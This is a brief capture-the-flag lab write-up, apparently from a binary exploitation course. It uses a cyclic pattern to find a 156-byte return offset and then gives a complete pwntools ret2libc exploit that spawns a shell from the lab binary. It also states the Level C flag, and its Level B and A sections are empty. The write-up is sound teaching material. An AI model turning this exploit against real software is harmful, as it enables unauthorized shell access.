## lab05

**Level C**
My first attemp is finding the length of stack frame using cyclic payload:

![cyclic](05c1.png)

which reveals the return address offset is 156 bytes:

```python
p = cyclic(200)
print p # => 'aaaa...yaab'
f = cyclic_find(0x6261616f)
print f # => 156
```

Since libc is included, the addresses of `system` function and `"/bin/sh"` string can be found:

![syssh](05c2.png)

According to ret2libc technique, the following payload can be easily constructed:

```python
from pwn import *

p = process('/levels/lab05/lab5C')

ret = 0xffffffff
sysaddr = 0xb7e63190
shaddr = 0xb7f83a24

payload = 'Q' * 156 + p32(sysaddr) + p32(ret) + p32(shaddr)

p.recvuntil('?\n', drop=True)
p.sendline(payload)
p.interactive()

```

![flagc](05c3.png)

The flag is `s0m3tim3s_r3t2libC_1s_3n0ugh`.

---

**Level B**

---

**Level A**
